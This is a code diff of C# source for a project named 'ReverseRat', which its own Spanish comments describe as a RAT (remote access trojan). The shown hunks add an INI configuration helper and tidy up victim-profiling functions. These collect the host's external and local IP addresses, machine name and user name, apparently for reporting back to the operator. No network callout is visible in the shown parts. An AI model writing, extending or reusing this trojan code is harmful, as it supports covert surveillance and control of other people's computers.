@@ -1,30 +1,73 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Windows.Forms;
-using System.Text;
-using System.Net;
-using System.Collections;
 using System.IO;
-using System.Diagnostics;
-
-
+using System.Net;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows.Forms;
 
 namespace ReverseRat
 {
+
+
+    class IniFile   // revision 11
+    {
+        readonly string _path;
+        readonly string _exe = Assembly.GetExecutingAssembly().GetName().Name;
+
+        [DllImport("kernel32", CharSet = CharSet.Unicode)]
+        static extern long WritePrivateProfileString(string section, string key, string value, string filePath);
+
+        [DllImport("kernel32", CharSet = CharSet.Unicode)]
+        static extern int GetPrivateProfileString(string section, string key, string Default, StringBuilder RetVal, int Size, string FilePath);
+
+        public IniFile(string iniPath = null)
+        {
+            _path = new FileInfo(iniPath ?? _exe + ".ini").FullName;
+        }
+
+        public string Read(string key, string section = null)
+        {
+            var retVal = new StringBuilder(255);
+            GetPrivateProfileString(section ?? _exe, key, "", retVal, 255, _path);
+            return retVal.ToString();
+        }
+
+        public void Write(string key, string value, string section = null)
+        {
+            WritePrivateProfileString(section ?? _exe, key, value, _path);
+        }
+
+        public void DeleteKey(string key, string section = null)
+        {
+            Write(key, null, section ?? _exe);
+        }
+
+        public void DeleteSection(string section = null)
+        {
+            Write(null, null, section ?? _exe);
+        }
+
+        public bool KeyExists(string key, string section = null)
+        {
+            return Read(key, section).Length > 0;
+        }
+    }
+
+
 
     // Funciones de todo tipo para operación del RAT
     class Funciones
     {
 
        public static string HashServer = "";
-       public string ObtenerIP() // IP Externa y Lan
+       public string ObtenerIp() // IP Externa y Lan
         {
-            string IPExterna = "";
-            String strHostName;
-            // Getting Ip address of local machine...
+            string ipExterna = "";
+           // Getting Ip address of local machine...
             // First get the host name of local machine.
-            strHostName = Dns.GetHostName();
-            Console.WriteLine("Local Machine's Host Name: " + strHostName);
+            var strHostName = Dns.GetHostName();
+            Console.WriteLine(@"Local Machine's Host Name: " + strHostName);
             // Then using host name, get the IP address list..
             IPHostEntry ipEntry = Dns.GetHostByName(strHostName);
             IPAddress[] addr = ipEntry.AddressList;
@@ -41,23 +84,22 @@ namespace ReverseRat
             s = s.Substring(19);
             for (int j = 0; j < s.Length; j++)
             {
-                if (char.IsDigit(s[j]) == true || s[j] == '.')
+                if (char.IsDigit(s[j]) || s[j] == '.')
                 {
-                    IPExterna = IPExterna + s[j].ToString();
+                    ipExterna = ipExterna + s[j];
                 }
             }
-            return IPExterna + "/" + addr[0].ToString();
+            return ipExterna + "/" + addr[0];
         }
 
 
        // Obtiene nombre de usuario y Nombre de PC
-       public string ObtenPCUser() 
+       public string ObtenPcUser() 
        {
-           string NombreEquipo = "", NombreUsuario = "";
-           NombreEquipo = Environment.MachineName;
-           NombreUsuario = Environment.UserName;
+           var nombreEquipo = Environment.MachineName;
+           var nombreUsuario = Environment.UserName;
 
-           return NombreEquipo + "/" + NombreUsuario;
+           return nombreEquipo + "/" + nombreUsuario;
        }
 
        public string TipoSistemaOperativo()
